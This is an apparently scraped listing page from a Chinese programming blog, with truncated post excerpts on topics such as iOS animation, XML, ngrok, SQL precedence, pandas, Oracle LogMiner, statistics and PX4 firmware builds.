		<a class="list__footer-readmore btn" href="/posts/8f34385509c73413d027d7494882bbeb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b01954bd19598347160143195a312316/" rel="bookmark">
			使用 iOS 8 Spring Animation API 创建动画
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Animation API 自 iOS 8 开始，Apple 公开了 Spring Animation 的 API，开发者也可以使用简单的代码创建这类动画效果了：
+ (void)animateWithDuration:(NSTimeInterval)duration delay:(NSTimeInterval)delay usingSpringWithDamping:(CGFloat)dampingRatio initialSpringVelocity:(CGFloat)velocity options:(UIViewAnimationOptions)options animations:(void (^)(void))animations completion:(void (^)(BOOL finished))completion 该方法是UIView的类方法。
Spring Animation 的 API 和一般动画相比多了两个参数，分别是usingSpringWithDamping和initialSpringVelocity。
usingSpringWithDamping 参数 usingSpringWithDamping的范围为0.0f到1.0f，数值越小「弹簧」的振动效果越明显。下图演示了在initialSpringVelocity为0.0f的情况下，usingSpringWithDamping分别取0.2f，0.5f和1.0f的情况。
Spring Animation 是一种特殊的动画曲线，自从 iOS 7 开始被广泛应用在系统动画中。
initialSpringVelocity 参数 initialSpringVelocity则表示初始的速度，数值越大一开始移动越快。下图演示了在usingSpringWithDamping为1.0f时，initialSpringVelocity分别取5.0f，15.0f和25.0f的情况。值得注意的是，初始速度取值较高而时间较短时，也会出现反弹情况。
使用 Spring Animation 是线性动画或 ease-out 动画的理想替代品。由于 iOS 本身大量使用的就是 Spring Animation，用户已经习惯了这种动画效果，因此使用它能使 App 让人感觉更加自然，用 Apple 的话说就是「instantly familiar」。此外，Spring Animation 不只能对位置使用，它适用于所有可被添加动画效果的属性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3e0108de032ceaf9e971a1ff06da590/" rel="bookmark">
			XML文件详解以及解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、xml基础详解：
1、概述：
xml:即可扩展标记语言，xml是互联网数据传输的重要工具，它可以跨越互联网任何的平台，不受编程语言和操作系统的限制，可以说它是一个拥有互联网最高级别通行证的数据携带者。xml是当前处理结构化文档信息中相当给力的技术，xml有助于在服务器之间穿梭结构化数据，这使得开发人员更加得心应手的控制数据的存储和传输。
Xml用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。Xml是标准通用标记语言（SGML）的子集，非常适合Web传输。XML提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据。
2、xml的特点及作用:
特点：
v xml与操作系统、编程语言的开发平台都无关；
v 实现不同系统之间的数据交互。
作用：
v 配置应用程序和网站；
v 数据交互；
v Ajax基石。
在配置文件里边所有的配置文件都是以XMl的格式来编写的。
跨平台进行数据交互，它可以跨操作系统，也可以跨编程语言的平台。
Ajax是现在目前比较流行的一个网络交互的技术。Ajax里面最后一个x实际上就是xml的缩写。Xml（Extensible Markup Language）是可扩展标记语言
一个xml文档必须要有第一行的声明和它的文档元素的描述信息就可以了。
3、xml声明
例子：
注：xml声明一般是xml文档的第一行；xml声明由以下几个部分组成：
4、根元素
它是xml文档里面唯一的；它的开始是放在最前面，结束是放在最后面。
5、元素：
(1) 所有的xml元素都必须有结束标签；
(2) xml标签对大小写敏感；
(3) xml必须正确地嵌套；
（4）元素的命名规则：
名称中可以包含字母、数字或者其他的字符；
名称不能以数字或者标点符号开始；
名称中不能包含空格。
（5）空元素
6、属性
（1）语法
&lt;元素名 属性名=“属性值”/&gt;
例：&lt;Student ID=“S100”&gt;
&lt;Name&gt;Tom&lt;/Name&gt;
&lt;/Student&gt;
(2)注意：
属性值用双引号包裹；一个元素可以有多个属性，它的基本格式为：
&lt;元素名 属性名=“属性值” 属性名=“属性值”&gt;;
属性值中不能够直接包含&lt;.”,&amp;。
7、实体：
在xml中，一些字符拥有特殊的意义。如果把字符“&lt;”放在xml元素中，会发生错误，这是因为解析器会把它当作新元素的开始，这样会产生xml错误：
为了避免这个错误，请用实体引用来代替“&lt;”字符：
xml中5个预定义实体
8、注释
注:注释内容中不要出现”--”;不要把注释放在标签中间；注释不能嵌套。
9、总结：
（1）xml描述的是文档的内容与语义，而不是文档应当如何显示；
（2）格式正规（well formed）的xml文档
遵循如下规则的xml文档称为格式正规的xml文档：
v 必须有xml声明语句；
v 必须有且仅有一个根元素；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3e0108de032ceaf9e971a1ff06da590/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/362eed62362218691e5d397147a565ed/" rel="bookmark">
			MAC 下使用 ngrok 实现内网穿透
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 下载 MAC 版的 ngrok：https://ngrok.com/download
2. 解压到指定目录：
$ unzip -n ngrok-stable-darwin-amd64.zip -d /tmp
3. 进入到解压后的 ngrok 所在路径：
$ cd /tmp
4. 开启服务：
$ ./ngrok http localhost:8080
输入命令后会先出现图1，图2的情况，稍等片刻，等 Session Status 显示为 online 状态时即可使用外网访问。即：以前使用http://localhost:8080/testWeb 访问，现在便可使用http://744fb6df.ngrok.io/testWeb进行访问，http://744fb6df.ngrok.io 就是本地服务映射到外网的地址。其中 744fb6df 不是固定的，在每次开始 ngrok 服务的时候都会变更。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1be11aa79252080d7fb33431e1fa4e7a/" rel="bookmark">
			sql ,hql 使用 or 注意使用()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; 当 or 和 and 共用时:
如：
select * from user where age is null or age &lt; 18 and name like : name
在没有括号情况下 ，and 优先级小于 or ，相当于
select * from user where （age is null） or （age &lt; 18 and name like : name ）
，而所需的查询是
select * from user where （age is null or age &lt; 18） and name like : name
转载于:https://my.oschina.net/yukong/blog/956599
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9577185f1034e2856d1798844dd567d7/" rel="bookmark">
			字符串置换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定两个字符串，请设计一个方法来判定其中一个字符串是否为另一个字符串的置换。
置换的意思是，通过改变顺序可以使得两个字符串相等。
样例
"abc" 为 "cba" 的置换。
"aabc" 不是 "abcc" 的置换。
1 public class Solution { 2 /** 3 * @param A a string 4 * @param B a string 5 * @return a boolean 6 */ 7 public boolean stringPermutation(String A, String B) 8 { 9 // Write your code here 10 List&lt;String&gt; list = new ArrayList&lt;&gt;(); 11 List&lt;String&gt; list1 = new ArrayList&lt;&gt;(); 12 char[] a = new char[A.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9577185f1034e2856d1798844dd567d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ceeb638382af650a58c0d90fe01b4757/" rel="bookmark">
			关于富文本编辑器ckeditor在前后端分离项目中的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.引入ckeditor,并初始化,这一点不用多说
二.图片上传:
图片上传需要自己配置后台请求路径;本文后台请求是自己写的,没有使用插件,而且前端页面与后台图片上传地址域名不一致.导致最原始的DEMO永远无法解决上传图片之后回显的跨域问题.
最后设置:
config.filebrowserUploadUrl="http://192.168.30.242:2225/ckeditor/uploadImg?backUrl=http://127.0.0.1:8020/party-construction-page/dangjian2/getFile.html"; 使用backUrl参数回调,并在页面同级域名下添加getFile.HTML页面; 下面是后台代码
@RequestMapping(value = "/uploadImg") public void upload(HttpServletRequest request, HttpServletResponse response, @RequestParam("upload") MultipartFile multipartFile) throws IOException { response.setContentType("text/html; charset=UTF-8"); response.setHeader("Cache-Control", "no-cache"); logger.info("imag uploading"); String path = this.uploadDir + "/"; String suffix = multipartFile.getOriginalFilename().substring(multipartFile.getOriginalFilename().lastIndexOf(".")).toLowerCase(); String fileName = "image" + "/" + DateTools.dateToString(new Date(), DateFormatString.yyyy_MM_dd) + "/" + System.currentTimeMillis() + suffix; File targetFile = new File(path, fileName); if (!targetFile.getParentFile().exists()) { targetFile.getParentFile().mkdirs(); } try { multipartFile.transferTo(targetFile); } catch (Exception e) { logger.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ceeb638382af650a58c0d90fe01b4757/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c7843fc9568c45891a5938cf31a3be4/" rel="bookmark">
			【Python学习系列十五】pandas库DataFrame行列操作使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 参考：http://pandas.pydata.org/pandas-docs/stable/api.html#dataframe
data['w'] #选择表格中的'w'列，使用类字典属性,返回的是Series类型 data.w #选择表格中的'w'列，使用点属性,返回的是Series类型 data[['w']] #选择表格中的'w'列，返回的是DataFrame类型 data[['w','z']] #选择表格中的'w'、'z'列 data[0:2] #返回第1行到第2行的所有行，前闭后开，包括前不包括后 data[1:2] #返回第2行，从0计，返回的是单行，通过有前后值的索引形式， #如果采用data[1]则报错 data.ix[1:2] #返回第2行的第三种方法，返回的是DataFrame，跟data[1:2]同 data['a':'b'] #利用index值进行切片，返回的是**前闭后闭**的DataFrame, #即末端是包含的 data.irow(0) #取data的第一行 data.icol(0) #取data的第一列 data.head() #返回data的前几行数据，默认为前五行，需要前十行则data.head(10) data.tail() #返回data的后几行数据，默认为后五行，需要后十行则data.tail(10) ser.iget_value(0) #选取ser序列中的第一个 ser.iget_value(-1) #选取ser序列中的最后一个，这种轴索引包含索引器的series不能采用ser[-1]去获取最后一个，这会引起歧义。 data.iloc[-1] #选取DataFrame最后一行，返回的是Series data.iloc[-1:] #选取DataFrame最后一行，返回的是DataFrame data.loc['a',['w','x']] #返回‘a’行'w'、'x'列，这种用于选取行索引列索引已知 data.iat[1,1] #选取第二行第二列，用于已知行、列位置的选取。 下面代码示例实现从csv中读取然后提起个别列重新输出csv trainds=pd.read_csv(r"D:\train_normal.csv", header=0, encoding='utf-8') sampleds = pd.DataFrame(trainds[['age','sex','account_age','is_use']]) sampleds.to_csv('D:\sample.csv',index=False) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dba352e709657c9b86928066081e864/" rel="bookmark">
			漫步数理统计三十——依概率收敛
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇博文我们将正式地陈述一系列随机变量靠近某个随机变量。
定义1： {Xn} 是一系列随机变量， X 是定义在样本空间上的随机变量。我们说Xn依概率收敛到 X ，如果对于ϵ&gt;0 limn→∞P[|Xn−X|≥ϵ]=0 或者等价的 limn→∞P[|Xn−X|&lt;ϵ]=1 如果成立，我们一般写成 Xn→PX 如果 Xn→PX ，我们常说 Xn−X 的差收敛到0。极限随机变量 X 经常是一个常数；例如X是一个退化的随机变量。
说明依概率收敛的一种方法是用切比雪夫定理，具体会在下面的证明中给出，为了强调我们是一系列随机变量，我们在随机变量上给出下标，像 X¯ 写成 X¯n 。
定理1： (弱大数定理) {Xn} 是一系列独立同分布的随机变量，均值为 μ ，方差为 σ2&lt;∞ ， X¯n=n−1∑ni=1Xi ，那么 X¯n→Pμ 证明： 回忆一下 X¯n 的均值与方差分别为 μ,σ2/n ，因此根据切比雪夫定理，对于任意的 ϵ&gt;0 P[|X¯−μ|≥ϵ]=P[|X¯−μ|]≥(ϵn‾‾√/σ)(σ/n‾‾√)≤σ2nϵ2→0 || 这个定理说明，当 n 取向∞时， X¯ 分布的所有质量收敛到 μ 。也就时候对于大的 n ，X¯接近 μ ，但是多接近呢？例如如果我们用 X¯n 估计 μ ，那么估计误差是多少？这个问题留到下篇博文讲解。
还有一个强大数定理，它弱化了定理1的假设：随机变量 Xi 独立且都有有限的均值 μ ，因此强大数定理是一阶矩定理，而弱大数定理需要二阶矩存在。
还有些关于依概率收敛的定理，我们在后面会用到，首先是两个关于依概率收敛对线性封闭的定理。
定理2： 假设 Xn→PX,Yn→PY ，那么 Xn+Yn→PX+Y 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dba352e709657c9b86928066081e864/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04cae360a71a4239949a3f480a8cb2e4/" rel="bookmark">
			『ORACLE』日志挖掘（11g）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、启动最小补充日志，和无条件主键补充日志，
alter database add supplemental log data;
alter database add supplemental log data (primary key) columns;
2、字典来源：源库日志字典，源库在线数据字典。
（1)源库日志字典：调用dbms_logmnr_d.build存储过程把LogMiner字典提取到源库的重做日志。
begin dbms_logmnr_d.build(options=&gt;dbms_logmnr_d.store_in_redo_logs);
End;
/
下面查询日志日志字典存储位置
Select sequence#,name,dictionary_begin,dictionary_end from v$archived_log where dictionary_begin='YES' or dictionary_end='YES';
（2）源库在线数据字典作为LogMiner字典时，直接在启动日志挖掘时通过start_logmnr过程的options参数指定。
如
begin dbms_logmnr.start_logmnr(options=&gt;dbms_logmnr.dict_from_online_catalog);
end;
/
做破坏，然后使用日志挖掘修复。
select ename,sal from scott.emp where deptno=30;
update scott.emp set sal=sal/2 where deptno=30;
commit;
select ename,sal from scott.emp where deptno=30;
3 注册重做日志。
(1)手动注册。
begin
dbms_logmnr.add_logfile(
logfilename=&gt;’/u01/app/oracle/o1_mf_1_138_3f3303_.arc’,
options=&gt;dbms_logmnr.addfile);
end;
/
反复执行可以增加多个归档日志，如果采用日志字典，则需要注册日志字典所在日志。
（2）自动注册。
使用dbms_logmnr.start_logmnr启动挖掘会话时，使用options参数说明即可，比手动注册方便多了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04cae360a71a4239949a3f480a8cb2e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4852a733258b8c4e4f61e0daaecac925/" rel="bookmark">
			移动硬盘提示磁盘结构损坏且无法读取怎么办
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		移动硬盘出现“磁盘结构损坏且无法读取”，1、突然关机；2、硬盘没有正常通过系统卸载；3、病毒破坏；4、有可能是usb供电不足；5、也可能是文件丢失；6、还可能是盘片损坏。
1、遇到这种情况，第一要试的工具是系统自带的CHKDSK 卷标 / F 来修复，比如输入CMD：命令格式：CHKDSK /F G: (G:是移动磁盘盘符) 2、先用分区工具，比如diskgenius修复一下分区错误，或还原一下文件，如果还晃能正常读取，就换USB接口尝试，但切记不能格式化硬盘，否则数据就没了。 3、如果是台式机，换后置接口。如果是笔记本，试一试其它接口。如果至少有一个usb接口正常，说明是供电不足的问题。 4、如果依然不正常，在别人电脑上测试。如果多台电脑都不正常，说明是移动硬盘硬件问题。 5、接下来，依次替换数据线、移动硬盘盒，如果还不正常，说明移动硬盘坏了。 6、这时候你应该考虑是否有重要的数据要恢复，因为移动硬盘应该有很多坏道导致的上面的问题，如果有，就使用easyrecovery等相似的软件先把数据弄出来，数据恢复相关的教程就不介绍了，很简单，另外diskgenius专业版也可以恢复数据。 7、 恢复了数据后就可以考虑来修复移动硬盘了，一般都是强插拔、坏道问题引起的分区故障。这时候数据已经恢复就可以尝试格式化。最好先把你的移动硬盘接从盘用 MHDD软件检下坏道有多少，坏道问题会因为通电而加重，出现此类问题应该停止继续通电操作，MHDD软件不但可以检查坏道，还可以修复坏道，所以要尝试 修复，如果能修复好当然可以继续使用，如果修不好； 8、修复不了的话，这时候就试着返厂维修，一般正品移动硬盘都是有几年保修的，如果你的过了保修期，而且还真想要这个移动硬盘的话可以去找专业的硬盘维修人员给钱修一下，如果修的钱太贵还不如直接买个新的了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60b9dd3cee5447e01950006324e931cc/" rel="bookmark">
			统计中的p-value检验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近和一个老同学讨论统计中的p-value检验问题，其中涉及到为什么需要用p-value来做假设检验的判断依据，上网查到了一个很好的例子： 教室里四位同学将装了若干数量的白球和黑球的箱子放在了课桌上，然后他们叫来了他们的小伙伴小花同学。他们对小花说：“小花，我们来玩个猜猜猜的游戏吧，你在这个箱子里摸5次球，每次摸完都要放回去再摸下一次，然后你猜里面的白球和黑球是不是一样多。”，小花就愉快地同意了。小花按照要求摸了三次球，每一次都是白球，这时她的心里已经有点怀疑白球和黑球是不是各一半了，她又继续摸，又摸了两次，还都是白球，这时她就大声地说：“箱子里面的白球和黑球肯定不是一样多的”。小伙伴们打开箱子，发现果然大部分的球都是白球。小花的判断为什么会对呢？来做个简单的概率计算，如果白球和黑球数量一样多的话，那么每次都摸到白球的概率是1/2。她连摸三次都是白球的概率是：1/2*1/2*1/2=1/8=12.5%，这种事件发生的概率已经很低。她连摸五次都是白球的概率是：1/2*1/2*1/2*1/2*1/2=1/32=3.125%，这种事件发生的概率已经极低。这就是假设检验的原理：在一定的统计假设的前提下，如果发生了小概率事件，我们就有理由怀疑假设的真实性，从而拒绝接受该假设。小概率事件不会发生，是假设检验的前提。在这个摸球故事中，假设是白球与黑球数量相同，但是小花摸了5次都是白球，概率是3.125%属于小概率事件，因此我们拒绝假设，也就是拒绝认为白球与黑球数量相同。最后一个问题，概率低到多少会被认为是小概率事件呢？英国的统计学家Ronald Fisher把1/20作为小概率标准，也就是0.05，从此0.05或者比0.05小就叫做小概率事件。这个0.05就是P Value. 这个例子说明，在做判断的时候，是很难做出很好的决策的，因为有些时候，样本数据中提供的信息量很少，因此需要通过假设的方式，提供额外的信息，然后在提供这些额外信息的基础上，做进一步的分析，看得出的结论是否与这个假设矛盾，如果矛盾则反推出这个假设是错误的，否则接受这个假设。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7acff1baa5364ad1330870b24938a149/" rel="bookmark">
			Ubuntu操作系统下Pixhawk原生固件PX4的编译方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Ubuntu上搭建环境相对简单许多，按照PX4中文维基官网的教程即可。
工具链安装 权限设置 把用户添加到用户组　“dialout”（如果这步没做，会导致很多用户权限问题）:
.1 sudo usermod -a -G dialout $USER然后注销后，重新登录，因为重新登录后所做的改变才会有效
安装CMake .1 sudo add-apt-repository ppa:george-edison55/cmake-3.x -y .2 sudo apt-get update .3 # 必备软件(python、git、qt) .4 sudo apt-get install python-argparse git-core wget zip \ python-empy qtcreator cmake build-essential genromfs -y .5 # 仿真工具 .6 sudo add-apt-repository ppa:openjdk-r/ppa .7 sudo apt-get update .8 sudo apt-get install openjdk-8-jre .9 sudo apt-get install ant protobuf-compiler libeigen3-dev libopencv-dev openjdk-8-jdk openjdk-8-jre clang-3.5 lldb-3.5 -y 卸载模式管理器 Ubuntu配备了一系列代理管理，这会严重干扰任何机器人相关的串口（或usb串口），卸载掉它也不会有什么影响。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7acff1baa5364ad1330870b24938a149/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45b2360d54be1ce23cfbc40df87d1f90/" rel="bookmark">
			iOS 画线（曲线、虚线、直线）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是Quartz2D Quartz2D是一个二维绘图引擎，同时支持iOS和Mac系统Quartz2D能做什么 绘制图形：线条、三角形、矩形、圆、弧等绘制文字绘制、生成图片（图像）读取、生成PDF截图、剪裁图片自定义UI控件 什么是图形上下文（Graphics Context） 可以理解为就是一个画板。其结构是一个CGCOntextRef类型的数据结构作用：保存绘图信息、绘图状态，决定绘制的输出目标（PDF、图片等）相同的一套绘图系列，制定了不同的Graphics Context,就可将相同的图像绘制到不同的目标上Quartz2D提供几种类型的Graphics Context bit（位图上下文）pdfwindowlayer(自定义view) 如何利用Quartz2D绘制东西到View上 建立图形上下文用来保存绘图信息图形上下文必须和View相关联，这样才能将内容画在View上面自定义View步骤 建立一个类，继承自UIView实现- (void)drawRect:(CGRect)rect方法 只有drawRect这个方法里面才能获取到跟View的layer相关的图形上下文绘制相应内容利用图形上下文将绘制的内容渲染显示到View上绘图步骤 获取上下文创建路径把路径添加到上下文渲染上下文 这里用三种方式实现画直线 //需要创建路径 -(void)drawLine1{ //1、获取图形上下文 CGContextRef ctx = UIGraphicsGetCurrentContext(); //2、描述路径 //创建路径 CGMutablePathRef path = CGPathCreateMutable(); //设置起点 CGPathMoveToPoint(path, NULL, 50, 150); //设置终点 CGPathAddLineToPoint(path, NULL, 100, 100); //颜色 [[UIColor redColor] setStroke]; //线宽 CGContextSetLineWidth(ctx, 20.0); //设置连接样式 CGContextSetLineJoin(ctx, kCGLineJoinBevel); //设置顶角样式 CGContextSetLineCap(ctx, kCGLineCapButt); //3、把路径添加到上下文 CGContextAddPath(ctx, path); //4、渲染上下文到View的layer CGContextStrokePath(ctx); } //不需要创建路径 -(void)drawLine2{ //1、获取图形上下文 CGContextRef ctx = UIGraphicsGetCurrentContext(); //2、描述路径（底层封装路径） CGContextMoveToPoint(ctx, 50, 50); CGContextAddLineToPoint(ctx , 200, 200); //3、渲染上下文到View的layer CGContextStrokePath(ctx); } //BezierPath已经封装好了 -(void)drawLine3{ //贝瑟尔路径 //1、创建路径 UIBezierPath *path = [UIBezierPath bezierPath]; //2、设置起点 [path moveToPoint:CGPointMake(50, 50)]; //设置终点 [path addLineToPoint:CGPointMake(200, 100)]; [path setLineWidth:10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45b2360d54be1ce23cfbc40df87d1f90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f27ffdcd20bfc8fc8d48288fd4fb7b0/" rel="bookmark">
			合并、联合、融合和聚合之间的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.合并是指同一图层之间的操作。
2.联合是指不同图层之间的操作。联合工具用于计算任意数量的要素类和要素图层的几何并集。所有输入要素类或要素图层必须是多边形。输出要素类将包含代表所有输入的几何并集的多边形以及所有输入要素类的所有字段。
3.融合是指将具有相同类别的（某个属性字段相同）的要素合并为一个新的要素，例如可以讲中国东部的省份地区，基于相同属性字段“地区”，将各个省级行政区域融合得到华东和华中两个区域。
4.聚合是指将比较聚集的或邻近的要素聚合为一个新的面要素，即如果两个面要素的边界在指定的距离之内，则两个面要素将会合并在一起。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/296/">«</a>
	<span class="pagination__item pagination__item--current">297/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/298/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>